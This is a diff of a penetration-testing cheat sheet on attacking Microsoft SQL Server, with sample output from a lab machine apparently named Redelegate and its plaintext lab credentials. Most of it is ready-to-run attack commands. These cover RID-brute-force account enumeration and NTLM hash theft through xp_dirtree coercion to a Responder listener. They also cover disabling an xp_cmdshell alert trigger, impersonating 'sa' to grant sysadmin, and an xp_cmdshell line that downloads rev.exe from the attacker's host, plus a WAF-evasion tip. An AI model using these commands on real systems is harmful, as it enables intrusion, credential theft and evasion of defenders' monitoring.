@@ -6,6 +6,55 @@ tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "Mssql", "Database", "Wi
 
 ### Enum
 
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+#### 1. List Users that Can be Impersonated
+
+```console
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_impersonate
+```
+
+```console {class="sample-code"}
+$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_impersonate
+MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
+ENUM_IMP... 10.129.254.242  1433   DC               [-] No users with impersonation rights found.
+```
+
+#### 2. Enumerate Active MSSQL Logins
+
+```console
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_logins
+```
+
+```console {class="sample-code"}
+$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_logins     
+MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
+ENUM_LOGINS 10.129.254.242  1433   DC               [+] Logins found:
+ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - sa
+ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - SQLGuest
+```
+
+#### 3. Enumerate Linked MSSQL Servers
+
+```console
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links
+```
+
+```console {class="sample-code"}
+$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_links 
+MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
+ENUM_LINKS  10.129.254.242  1433   DC               [+] Linked servers found:
+ENUM_LINKS  10.129.254.242  1433   DC               [*]   - WIN-Q13O908QBPG\SQLEXPRESS
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
 #### 1. Import Module
 
 ```console
@@ -26,121 +75,17 @@ Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query
 
 <small>*Ref: [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1)*</small>
 
----
-
-### Abuse #1: Steal NTLM hash
-
-#### 1. Start a Listener
-
-```console
-sudo responder -I tun0
-```
-
-#### 2. Coercing Authentication
-
-{{< tab set1 tab1 >}}Method 1{{< /tab >}}
-{{< tab set1 tab2 >}}Method 2{{< /tab >}}
-{{< tab set1 tab3 >}}Method 3{{< /tab >}}
-{{< tabcontent set1 tab1 >}}
-
-```console
-xp_dirtree '\\<LOCAL_IP>\any\thing';
-```
-
-{{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
-
-```console
-use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
-```
-
-{{< /tabcontent >}}
-{{< tabcontent set1 tab3 >}}
-
-```console
-load_file('\\<LOCAL_IP>\any\thing');
-```
-
 {{< /tabcontent >}}
 
 ---
 
-### Abuse #2: Run xp_cmdshell
-
-#### 1. Check Any Policy Blocking xp_cmdshell \[Optional\]
-
-```console
-select name from sys.server_triggers;
-```
-
-#### 2. Disable Trigger if Any \[Optional\]
-
-```console
-disable trigger ALERT_xp_cmdshell on all server;
-```
-
-#### 3. Enable xp_cmdshell
-
-```console
-enable_xp_cmdshell;
-```
-
-#### 4. RCE
-
-```console
-xp_cmdshell whoami
-```
-
----
-
-### Abuse #3: Impersonate sa to run xp_cmdshell
-
-#### 1. Add User to Sysadmin
-
-```console
-execute as login = 'sa'; exec sp_addsrvrolemember '<USER>','sysadmin'
-```
-
-#### 2. Check
-
-```console
-SELECT is_srvrolemember('sysadmin');
-```
-
-#### 3. Enable xp_cmdshell
-
-```console
-execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
-```
-
-```console
-execute as login = 'sa'; reconfigure;
-```
-
-```console
-execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
-```
-
-```console
-execute as login = 'sa'; reconfigure;
-```
-
-#### 4. RCE
-
-```console
-execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl <LOCAL_IP>/rev.exe -o C:\ProgramData\rev.exe'
-```
-
-<small>*Note: try xp_cmDshElL to bypass WAF*</small>
-
----
-
-### Abuse #4: Domain Users Enum
+### Domain Users Enum
 
 {{< tab set2 tab1 >}}Linux{{< /tab >}}
 {{< tab set2 tab2 >}}Windows{{< /tab >}}
-{{< tab set2 tab3 >}}Metasploit{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
+{{< tab set2-1 tab1 >}}Manual{{< /tab >}}{{< tab set2-1 tab2 >}}nxc{{< /tab >}}{{< tab set2-1 tab3 >}}Metasploit{{< /tab >}}
+{{< tabcontent set2-1 tab1 >}}
 
 #### 1. Get Domain Name
 
@@ -224,53 +169,25 @@ REDELEGATE\Marie.Curie
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set2 tab2 >}}
+{{< tabcontent set2-1 tab2 >}}
 
-#### 1. Import Module
+#### 1. Domain Users Enum
 
 ```console
-Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth --rid-brute
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
-Warning: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] & - / \ $ ^ ; : " ' < > | ? @ ` * % + = ~
-```
-
-#### 2. Domain Users Enum
-
-```console
-Get-SqlServer-Enum-WinAccounts -SQLServerInstance '<TARGET>' -SqlUser '<USER>' -SqlPass '<PASSWORD>' –FuzzNum 10000
-```
-
-```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> Get-SqlServer-Enum-WinAccounts -SQLServerInstance "10.129.234.50" -SqlUser 'SQLGuest' -SqlPass 'zDPBpaF4FywlqIv11vii' –FuzzNum 10000
-[*] Attempting to authenticate to 10.129.234.50 as the login SQLGuest...
-[*] Connected.
-[*] Enumerating domain...
-[*] Domain found: REDELEGATE
-[*] Enumerating domain SID...
-[*] Domain SID found: 010500000000000515000000A185DEEFB22433798D8E847A
-[*] Brute forcing 10000 RIDs...
-[*] - WIN-Q13O908QBPG\Administrator
-[*] - REDELEGATE\Guest
-[*] - REDELEGATE\krbtgt
-[*] - REDELEGATE\Domain Guests
----[SNIP]---
-[*] 34 domain accounts / groups were found.
-
-name
-----
-REDELEGATE\Allowed RODC Password Replication Group
-REDELEGATE\Cert Publishers
-REDELEGATE\Christine.Flanders
+$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute
+MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
+MSSQL       10.129.254.242  1433   DC               498: REDELEGATE\Enterprise Read-only Domain Controllers
+MSSQL       10.129.254.242  1433   DC               500: WIN-Q13O908QBPG\Administrator
 ---[SNIP]---
 ```
-
-<small>*Ref: [Get-SqlServer-Enum-WinAccounts.psm1](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Get-SqlServer-Enum-WinAccounts.psm1)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set2 tab3 >}}
+{{< tabcontent set2-1 tab3 >}}
 
 #### 1. Metasploit
 
@@ -354,10 +271,174 @@ msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
 ```
 
 {{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
+
+#### 1. Import Module
+
+```console
+Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
+```
+
+```console {class="sample-code"}
+*Evil-WinRM* PS C:\programdata> Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
+Warning: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] & - / \ $ ^ ; : " ' < > | ? @ ` * % + = ~
+```
+
+#### 2. Domain Users Enum
+
+```console
+Get-SqlServer-Enum-WinAccounts -SQLServerInstance '<TARGET>' -SqlUser '<USER>' -SqlPass '<PASSWORD>' –FuzzNum 10000
+```
+
+```console {class="sample-code"}
+*Evil-WinRM* PS C:\programdata> Get-SqlServer-Enum-WinAccounts -SQLServerInstance "10.129.234.50" -SqlUser 'SQLGuest' -SqlPass 'zDPBpaF4FywlqIv11vii' –FuzzNum 10000
+[*] Attempting to authenticate to 10.129.234.50 as the login SQLGuest...
+[*] Connected.
+[*] Enumerating domain...
+[*] Domain found: REDELEGATE
+[*] Enumerating domain SID...
+[*] Domain SID found: 010500000000000515000000A185DEEFB22433798D8E847A
+[*] Brute forcing 10000 RIDs...
+[*] - WIN-Q13O908QBPG\Administrator
+[*] - REDELEGATE\Guest
+[*] - REDELEGATE\krbtgt
+[*] - REDELEGATE\Domain Guests
+---[SNIP]---
+[*] 34 domain accounts / groups were found.
+
+name
+----
+REDELEGATE\Allowed RODC Password Replication Group
+REDELEGATE\Cert Publishers
+REDELEGATE\Christine.Flanders
+---[SNIP]---
+```
+
+<small>*Ref: [Get-SqlServer-Enum-WinAccounts.psm1](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Get-SqlServer-Enum-WinAccounts.psm1)*</small>
+
+{{< /tabcontent >}}
 
 ---
 
-### Abuse #5: Run External Script
+### Abuse #1: Steal NTLM hash
+
+#### 1. Start a Listener
+
+```console
+sudo responder -I tun0
+```
+
+#### 2. Coercing Authentication
+
+{{< tab set3 tab1 >}}nxc{{< /tab >}}
+{{< tab set3 tab2 >}}SQL{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
+
+```console
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="sample-code"}
+$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M mssql_coerce -o L=10.10.14.56
+MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
+MSSQL_CO... 10.129.254.242  1433   DC               [*] Commands executed successfully, check the listener for results
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set3 tab2 >}}
+
+```console
+# Method 1
+xp_dirtree '\\<LOCAL_IP>\any\thing';
+```
+
+```console
+# Method 2
+use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
+```
+
+```console
+# Method 3
+load_file('\\<LOCAL_IP>\any\thing');
+```
+
+{{< /tabcontent >}}
+
+---
+
+### Abuse #2: Run xp_cmdshell
+
+#### 1. Check Any Policy Blocking xp_cmdshell \[Optional\]
+
+```console
+select name from sys.server_triggers;
+```
+
+#### 2. Disable Trigger if Any \[Optional\]
+
+```console
+disable trigger ALERT_xp_cmdshell on all server;
+```
+
+#### 3. Enable xp_cmdshell
+
+```console
+enable_xp_cmdshell;
+```
+
+#### 4. RCE
+
+```console
+xp_cmdshell whoami
+```
+
+---
+
+### Abuse #3: Impersonate sa to run xp_cmdshell
+
+#### 1. Add User to Sysadmin
+
+```console
+execute as login = 'sa'; exec sp_addsrvrolemember '<USER>','sysadmin'
+```
+
+#### 2. Check
+
+```console
+SELECT is_srvrolemember('sysadmin');
+```
+
+#### 3. Enable xp_cmdshell
+
+```console
+execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
+```
+
+```console
+execute as login = 'sa'; reconfigure;
+```
+
+```console
+execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
+```
+
+```console
+execute as login = 'sa'; reconfigure;
+```
+
+#### 4. RCE
+
+```console
+execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl <LOCAL_IP>/rev.exe -o C:\ProgramData\rev.exe'
+```
+
+<small>*Note: try xp_cmDshElL to bypass WAF*</small>
+
+---
+
+### Abuse #4: Run External Script
 
 #### 1. Run External Script (Python)
 
